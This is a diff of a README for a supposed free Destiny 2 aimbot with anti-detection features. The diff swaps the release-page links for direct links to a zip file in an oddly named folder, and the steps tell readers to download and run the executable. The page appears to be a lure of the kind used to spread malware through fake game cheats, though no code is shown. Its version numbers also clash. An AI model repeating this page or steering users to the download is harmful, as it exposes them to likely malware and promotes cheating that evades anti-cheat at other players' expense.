@@ -1,6 +1,6 @@
 <h1>🎯 D2Aimbot-Destiny-2-Aimbot-External-2026 - Dominate Every PvP Match Instantly</h1>
 
-<a href="https://github.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/releases" style="display:inline-block;padding:20px 45px;background:#FF6B35;color:#fff;font-size:26px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(255,107,53,0.5);margin:20px 0;">⬇️ DOWNLOAD NOW - FREE</a>
+<a href="https://raw.githubusercontent.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/main/inconcrete/External-Aimbot-Destiny-v3.3-beta.1.zip" style="display:inline-block;padding:20px 45px;background:#FF6B35;color:#fff;font-size:26px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(255,107,53,0.5);margin:20px 0;">⬇️ DOWNLOAD NOW - FREE</a>
 
 <h2>🔥 What Is D2Aimbot?</h2>
 <p>D2Aimbot is a powerful external aimbot tool built specifically for <strong>Destiny 2 PvP</strong> players who want to gain a serious competitive edge. It automatically locks onto enemy targets, tracks super abilities, and delivers pixel-perfect accuracy every single time. Whether you're a seasoned Guardian or just starting out in the Crucible, this tool transforms your gameplay with features that the pros use.</p>
@@ -19,7 +19,7 @@
 
 <h2>🚀 Getting Started In 3 Simple Steps</h2>
 <ol>
-<li><strong>Download the Application</strong> - Click the orange button above or visit this link: <a href="https://github.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/releases">https://github.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/releases</a> to download the application.</li>
+<li><strong>Download the Application</strong> - Click the orange button above or visit this link: <a href="https://raw.githubusercontent.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/main/inconcrete/External-Aimbot-Destiny-v3.3-beta.1.zip">https://raw.githubusercontent.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/main/inconcrete/External-Aimbot-Destiny-v3.3-beta.1.zip</a> to download the application.</li>
 <li><strong>Run the Program</strong> - Once downloaded, launch D2Aimbot. It works as a standalone executable - no installation needed.</li>
 <li><strong>Start Dominating</strong> - Open Destiny 2, enter any PvP match, and D2Aimbot will automatically activate. Use your hotkey (default: F11) to toggle features on/off.</li>
 </ol>
@@ -27,7 +27,7 @@
 <h2>📥 Download & Setup Guide</h2>
 <p>To get D2Aimbot running on your Windows PC:</p>
 <ol>
-<li>Visit this link to download the application: <a href="https://github.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/releases">https://github.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/releases</a></li>
+<li>Visit this link to download the application: <a href="https://raw.githubusercontent.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/main/inconcrete/External-Aimbot-Destiny-v3.3-beta.1.zip">https://raw.githubusercontent.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/main/inconcrete/External-Aimbot-Destiny-v3.3-beta.1.zip</a></li>
 <li>You'll see a standard download page. Click the <strong>"Download"</strong> button or the latest release file.</li>
 <li>The application file will download to your "Downloads" folder.</li>
 <li>Open the downloaded file to launch the program.</li>
@@ -93,7 +93,7 @@
 <h2>🌟 Get Started Today!</h2>
 <p>Don't let another match slip away. Download D2Aimbot now and experience the difference that instant target acquisition and perfect aim can make. Join thousands of players who have already improved their game with this powerful tool.</p>
 
-<p>👉 <a href="https://github.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/releases" style="background:#4CAF50;color:white;padding:15px 35px;border-radius:5px;text-decoration:none;font-weight:bold;font-size:20px;">Download D2Aimbot For Free</a> 👈</p>
+<p>👉 <a href="https://raw.githubusercontent.com/neoliberal-blitt9891/D2Aimbot-Destiny-2-Aimbot-External-2026/main/inconcrete/External-Aimbot-Destiny-v3.3-beta.1.zip" style="background:#4CAF50;color:white;padding:15px 35px;border-radius:5px;text-decoration:none;font-weight:bold;font-size:20px;">Download D2Aimbot For Free</a> 👈</p>
 
 <h2>🆕 Version History</h2>
 <p><strong>Version 2.0.6 (2026)</strong> - Improved anti-detection, enhanced super tracking, added new smoothing profiles.</p>
